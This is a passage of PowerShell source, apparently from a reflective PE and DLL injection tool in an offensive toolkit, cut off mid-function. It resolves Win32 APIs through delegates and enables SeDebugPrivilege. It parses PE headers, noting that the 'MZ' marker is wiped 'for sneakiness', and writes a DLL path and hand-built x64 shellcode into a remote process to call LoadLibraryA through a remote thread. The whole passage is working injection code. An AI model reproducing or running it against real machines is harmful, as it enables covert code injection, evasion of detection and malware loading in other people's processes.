		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
